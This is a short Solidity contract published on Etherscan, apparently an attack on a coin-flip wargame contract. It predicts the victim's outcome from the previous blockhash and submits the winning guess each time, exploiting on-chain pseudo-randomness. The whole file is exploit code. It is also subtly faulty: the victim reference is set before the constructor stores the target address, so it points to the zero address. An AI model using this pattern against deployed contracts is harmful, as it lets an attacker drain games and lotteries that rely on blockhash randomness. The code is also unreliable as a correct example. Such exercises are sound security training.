/**
 *Submitted for verification at Etherscan.io on 2022-08-03
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

interface Victim {
    function flip(bool _guess) external returns(bool);
}

contract Attacker {

    constructor(address _victimDc) {
        victimDc = _victimDc;
    }

    address victimDc;
    Victim victimContract = Victim(victimDc);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    function callFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if(side == _guess) {
            victimContract.flip(_guess);
        } else {
            victimContract.flip(!_guess);
        }
    }



}